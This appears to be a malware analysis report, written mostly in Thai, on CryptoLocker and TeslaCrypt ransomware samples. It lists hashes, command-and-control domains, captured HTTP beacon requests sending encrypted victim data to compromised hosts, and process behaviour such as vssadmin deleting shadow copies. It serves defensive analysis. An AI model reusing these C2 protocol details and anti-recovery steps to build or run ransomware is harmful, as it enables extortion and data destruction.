## Samples

**CryptoLocker**

- **File name**: 1002.exe
- **MD5**: 829dde7015c32d7d77d8128665390dab
- **SHA-1**: a4185032072a2ee7629c53bda54067e0022600f8
- [VirusTotal Scan Report](https://www.virustotal.com/en/file/5291232b297dfcb56f88b020ec7b896728f139b98cef7ab33d4f84c85a06d553/analysis/)

**TeslaCrypt_2015**

- **File name**: 2015–07–20-Nuclear-EK-payload-TeslaCrypt-2.0.exe
- **MD5**: 50fd967b39315d95f02127a2f05f6326
- **SHA-1**: 0097c1420f7b36e284de3e5c261e750572d09bc3
- [VirusTotal Scan Report](https://www.virustotal.com/en/file/8271d841b9971f04d6a48804d06ecd7185d71ed8546988b1697fbe01741a8572/analysis/)

**TeslaCrypt_2016_1**

- **File name**: 2016–04–05-TeslaCrypt-from-malspam.exe
- **MD5**: b3c00819cc192c93b295e53cc5df37ce
- **SHA-1**: 27ed7defb34c70ceeef17e4e241404d020a165c5
- [VirusTotal Scan Report](https://www.virustotal.com/en/file/8c699e0b4fcaf632fd3c07808da0cc77aad6f219640e00690496a56bfed3b0d6/analysis/)

**TeslaCrypt_2016_2**

- **File name**: 2016–04–06-pseudo-Darkleech-Angler-EK-payload-TeslaCrypt-after-latchamgallery.ca.exe
- **MD5**: 0265f31968e56500218d87b3a97fa5d5
- **SHA-1**: 2df9f107cd1c900cbe6153603bb0236b70a4ff3d
- [VirusTotal Scan Report](https://www.virustotal.com/en/file/c10f5d08c6ed8a614e2b15a3b71f0e1627b69cccb68394f250da2f3b2dd74240/analysis/)

## Network Behavior

**CryptoLocker**

- มัลแวร์ไม่สามารถติดต่อกับเซิร์ฟเวอร์ที่ใช้ออกคำสั่งและควบคุมได้ ทำให้กระบวนการเข้ารหัสไม่เกิดขึ้น
- ฟังก์ชัน/เมธอดที่มีความเกี่ยวข้องกับพฤติกรรมทางด้านเครือข่าย ได้แก่ [method_4](https://github.com/pe3zx/Ransomware/blob/master/Resources/CryptoLocker/decompiled/GClass0.cs#L240) และ [method_8](https://github.com/pe3zx/Ransomware/blob/master/Resources/CryptoLocker/decompiled/GClass0.cs#L334)
- รายการของเซิร์ฟเวอร์ที่ใช้ออกคำสั่งและควบคุม
  - cabin.su (404)
  - wrax.ru (404)
  - icals.ru (404)
  - yot.su (404)
  - hips.su (404)

**TeslaCrypt_2015**

- มัลแวร์มีการติดต่อกับเซิร์ฟเวอร์ที่ใช้ออกคำสั่งและควบคุมผ่านบริการของ tor2web (tor2web.org / onion.to)
- การส่งข้อมูลเกิดขึ้นบนโปรโตคอล HTTPS และถึงแม้จะมีความพยายามในการถอดรหัสข้อมูลที่ถูกส่งในโปรโตคอล HTTPS ข้อมูลที่ถูกส่งก็ยังมีการเข้ารหัสอีกชั้นอยู่

```
GET /img.php?876C417D636DEF80B203C817C3D25DE3045FABA9C2AA3003DE6C12B44827C4745DA68341259FB02311E4852E20891F4A96E7CAB9208F91AF058FA0FA383B056FDA9A24CAD1046B0C59DCF84C49E35673CF2E1866DCD99DB2A2F323D1276D66371763A376C747F4654E09DFDD05540ECE7B5A752B05F07A5C4B402EA3448BA2DBF437118AA6A6D89BBDCB9263BA13AA6B7DFEC920222A6670F22832427F33B657 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0
Host: zpr5huq4bgmutfnf.onion.to
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: disclaimer_accepted=1
```

- มัลแวร์มีการฝังข้อมูลบางส่วนซึ่งใช้ในการติดต่อกับเซิร์ฟเวอร์ที่ใช้ออกคำสั่งและควบคุมเอาไว้ ได้แก่
  - User agent: `Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0`
  - Cookie: `disclaimer_accepted = 1`
  - ไฟล์บนเซิร์ฟเวอร์ที่มัลแวร์จะทำการส่งข้อมูลไปคือไฟล์ `img.php`
  - เมธอดการส่งข้อมูลแบบ GET
- รายการเซิร์ฟเวอร์ที่ใช้ออกคำสั่งและควบคุมซึ่งตรวจพบในขั้นตอนของการวิเคราะห์มัลแวร์ ได้แก่
  - `zpr5huq4bgmutfnf.onion.to` / `zpr5huq4bgmutfnf.tor2web.org`
  - `gfdkotriam.fo4j4wnq51hepa.com` (512)
  - `kosdfnure75.op1gifsd05mllk.com` (512)
- มัลแวร์จะมีการติดต่อกับเซิร์ฟเวอร์ที่ใช้ออกคำสั่งและควบคุมเพื่อส่งข้อมูลต่างๆ ตามพารามิเตอร์ `Subject=%s&key=%s&addr=%s&size=%lld&version=%s&OS=%ld&ID=%d&gate=G%d&ip=%s&inst_id=%X%X%X%X%X%X%X%X` ซึ่งประกอบไปด้วยชื่อของคอมพิวเตอร์, กุญแจ, หมายเลขไอพี, รุ่นของระบบปฏิบัติการ, ข้อมูลบางส่วนจากรีจิสทรี, ค่าที่ได้จากการสร้างเพื่อใช้ยืนยันการติดเชื่อของมัลแวร์และค่าอื่นๆ
- มัลแวร์จะทำการตรวจสอบหมายเลขไอพีของเครื่องที่ติดเชื้อโดยการเชื่อมต่อกับเว็บไซต์ http://ipinfo.io/ip โดยใช้ค่า user agent เฉพาะที่ไม่ซ้ำกับการติดต่อกับเซิร์ฟเวอร์ที่ใช้ออกคำสั่งและควบคุม คือ `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)`
- มัลแวร์จะทำการตรวจสอบว่าเซิร์ฟเวอร์มีการตอบกลับมาด้วยค่าสตริง `---!!!INSERTED!!!---` หรือไม่ หากไม่มัลแวร์จะทำการเปลี่ยนเซิร์ฟเวอร์ที่ใช้ในการติดต่อเป็นเซิร์ฟเวอร์อื่น
- ตัวอย่างของพฤติกรรมทางด้านเครือข่ายของ TeslaCrypt_2015 สามารถดาวโหลดได้จาก [teslacrypt_2015.pcap](https://github.com/pe3zx/Ransomware/blob/master/Resources/TeslaCrypt_2015/teslacrypt_2015.pcap)

**TeslaCrypt_2016_1**

- มัลแวร์มีการส่งข้อมูลไปยังเซิร์ฟเวอร์ซึ่งมีความเป็นไปได้สูงว่าเป็นเซิร์ฟเวอร์ที่ถูกแฮกเพื่อใช้เป็นส่วนหนึ่งของการทำงานของมัลแวร์
- มัลแวร์มีการส่งข้อมูลบนโปรโตคอล HTTP แบบ POST โดยมีปลายทางอยู่ที่ไฟล์ชื่อ `binfile.php` ข้อมูลทั้งหมดจะมีการส่งผ่านพารามิเตอร์ชื่อว่า `data` และจะถูกเข้ารหัสโดยมัลแวร์ก่อนถูกส่งไปทุกครั้ง

```
POST /wp-content/plugins/wordpress-mobile-pack/libs/htmlpurifier-4.6.0/library/HTMLPurifier/DefinitionCache/Serializer/URI/binfile.php HTTP/1.1
Accept: @...8/..8.>.}..1.t>., .....
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.3 rv:11.0) like Gecko
Host: coldheartedny.com
Content-Length: 613
Cache-Control: no-cache

data=05C581E775D72353DB0F1CEEDF95B841DA7D786E6D21E8A95452E3FAC3120F07895692760CE95785915978EFAA68EDA456DFD87D7E7C200DE3320EE136362736A397F1731097994DB882845076723064F24C112F09E4065DA611A7D42ACAB972D0F41E3D4675EDEC3B48EE739F6D9D5A8F2B477B637E5AF068CBFBAC5176E210782AFBF1C24E7A07B563619D26B4C355209AD3E0A192EB76837979D0BAF7356BBB2B65A6371500EFE3BE33F947C2EDD50FB2553F6A18CFB56EC27D5DCDBAB2A028D4578457D827A663661C56A120367FC439186EEE3773BC7B507516822F6592A1B2B5BD34A1B9D831F53782436EAC76CE415D350F3E3AF6B60FE92349BFB5394C5D4C76B7AC4EB5D639D0268B6F123C871A5EBD06ADEB1B443FA5A14DB5C8211CE2714E316082AE8E767BBD6843658
```

- รายการเซิร์ฟเวอร์ที่ใช้ออกคำสั่งและควบคุมซึ่งตรวจพบในขั้นตอนของการวิเคราะห์มัลแวร์ ได้แก่
  - addagapublicschool.com (404)
  - helpdesk.keldon.info (404)
  - coldheartedny.com (200)
  - closerdaybyday.info (404)
  - studiosundaytv.com (404)
  - thejonesact.com (404)
- ตัวอย่างของพฤติกรรมทางด้านเครือข่ายของ TeslaCrypt_2016_1 สามารถดาวโหลดได้จาก [teslacrypt_2016_1.pcap](https://github.com/pe3zx/Ransomware/blob/master/Resources/TeslaCrypt_2016_1/teslacrypt_2016_1.pcap)

**TeslaCrypt_2016_2**

- มัลแวร์มีการส่งข้อมูลไปยังเซิร์ฟเวอร์ที่มึ่ความเป็นไปได้สูงว่าเป็นเซิร์ฟเวอร์ที่ถูกแฮกเพื่อใช้เป็นส่วนหนึ่งของการทำงานของมัลแวร์
- มัลแวร์มีการส่งข้อมูลบนโปรโตคอล HTTP แบบ POST โดยมีปลายทางอยู่ที่ไฟล์ชื่อ `strfile.php` ข้อมูลทั้งหมดจะมีการส่งผ่านพารามิเตอร์ชื่อว่า `data` และจะถูกเข้ารหัสโดยมัลแวร์ก่อนถูกส่งไปทุกครั้ง

```
POST /strfile.php HTTP/1.1
Accept: ., ..@..?..8.@..].F.t@., ".Z..*, .C....@.t, ..@..?..8.@..].F.t@.
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.3 rv:11.0) like Gecko
Host: naomihawkins.com
Content-Length: 645
Cache-Control: no-cache

data=DF968CE68B47D6E115623F6FF2A1E7B20A9B882E7F2ACF525D1AAFA1C0F4D84E02125DE89A97F202655A6E0AE26E2A160ED17A812CB5154D4F67F1D31B511DB76A914D0A49705EB8857C5F841AD9F556DB7B97AEF9BDEB760B2AE3D82FF28F967FE0EA4341FF293B446F7C21038E5138EAED7E244A816C112CB0E1ECFE499DDDF2B36F173478E9A4B412C994314858FF828871D95A661B201E9E955DA2C43836099020789C1AC1BBEB165E8D18F29082CD28BAE549952AF13CAB222E6FBFC626F3A61708A745EF0DEE3A4E7473398D383DB2427278F2CA403A5BC6962C1D024CC537A551CDE3CF6F16B56061A1DD3BB060DF542CB6BCE76EECFB09DA5D9FA9EFAA4E2BF792A9C91E5AAAAAE1C01405F240F26CC71F0F816C11ED6E0F1520A727597AA55B9F21FA360C3645FC26750E6366AF3CA1B8CFF12903F58225063B77DB
```

- รายการเซิร์ฟเวอร์ที่ใช้ออกคำสั่งและควบคุมซึ่งตรวจพบในขั้นตอนของการวิเคราะห์มัลแวร์ ได้แก่
  - traditions-and-custom.com (404)
  - naomihawkins.com (200)
  - getdiscounts.org (400)
  - 43nutrientes.com (400)
  - colinmccarthynfl.com (200)
- ตัวอย่างของพฤติกรรมทางด้านเครือข่ายของ TeslaCrypt_2016_2 สามารถดาวโหลดได้จาก [teslacrypt_2016_2.pcap](https://github.com/pe3zx/Ransomware/blob/master/Resources/TeslaCrypt_2016_2/teslacrypt_2016_2.pcap)

## Process and Thread Behavior

**CryptoLocker**

CryptoLocker นั้นเมื่อถึงจุดหนึ่งแล้วมัลแวร์จะมีการสร้างโปรเซสขึ้นมาใหม่ อ้างอิงจาก [method_7](https://github.com/pe3zx/ransomware/blob/master/Resources/CryptoLocker/decompiled/GClass0.cs#L313) ซึ่งเป็นฟังก์ชันสำหรับการสร้างชื่อแบบสุ่มใหม่ ชื่อที่ถูกสุ่มขึ้นมาของโปรเซสใหม่นั้นจะมีลักษณะแบบสุ่มขนาดความยาว 10 ตัวอักษร โดยชื่อของโปรเซสใหม่นี้มีที่มาจากผลลัพธ์ 10 ตัวอักษรของการใช้ฟังก์ชันแฮช SHA-1 ในการแฮชค่า MachineGuid จากตัวแปร [string_0](https://github.com/pe3zx/ransomware/blob/master/Resources/CryptoLocker/decompiled/GClass0.cs#L34) ที่ถูกเข้ารหัสโดยอัลกอริธึม AES กุญแจที่ถูกใช้ในการเข้ารหัสนี้จะอยู่ที่ตัวแปร [string_2](https://github.com/pe3zx/ransomware/blob/master/Resources/CryptoLocker/decompiled/GClass0.cs#L38) ตัวอย่างของชื่อโปรเซสใหม่ เช่น 66BDBF2E65.exe นอกจากนั้นมัลแวร์ยังมีการเรียกใช้โปรเซส taskkill.exe กับพารามิเตอร์ /F /IM ในการปิดโปรเซสของมัลแวร์ที่ทำงานอยู่ก่อนด้วยใน [method_1](https://github.com/pe3zx/ransomware/blob/master/Resources/CryptoLocker/decompiled/GClass0.cs#L194)

**TeslaCrypt_2015**

TeslaCrypt_2015 จะมีการสร้างโปรเซสใหม่โดยการตั้งชื่อในลักษณะ svc([a-z]{3}).exe เช่น svcivy.exe โดยมัลแวร์จะมีการเรียกโปรเซส vssadmin.exe ขึ้นมาเพื่อทำการลบ shadow copies ซึ่งเป็นไฟล์แบ็คอัพของเซอร์วิส Volume Shadow Copy ด้วย และเมือการเข้ารหัสเสร็จแล้ว มัลแวร์จึงจะมีการเรียกโปรเซสอื่น ๆ ที่เกี่ยวข้องกับการแสดงรายละเอียดการโอนเงินค่าไถ่ อาทิ IEXPLORER.EXE และ NOTEPAD.EXE

![ลักษณะการสร้างโปรเซสใหม่ของ TeslaCrypt_2015](https://i.imgur.com/PueS5CY.png)

**TeslaCrypt_2016_1**

TeslaCrypt_2016/1 จะมีการสร้างโปรเซสใหม่โดยใช้ชื่อว่า wlrmdr.exe เสมอ และเช่นเดียวกับ TeslaCrypt_2015 มัลแวร์จะมีการเรียกโปรเซส อาทิ IEXPLORER.EXE และ NOTEPAD.EXE เพื่อแสดงรายละเอียดการโอนเงินค่าไถ่เมื่อการเข้ารหัสเสร็จสิ้น

![ลักษณะการสร้างโปรเซสใหม่ของ TeslaCrypt_2016_1](https://i.imgur.com/Jf5pjuD.png)

**TeslaCrypt_2016/2**

TeslaCrypt_2016/2 จะมีการสร้างโปรเซสใหม่โดยมีชื่อในลักษณะสุ่มขนาดความยาว 12 ตัวอักษร เช่น yrovvcaexhyo.exe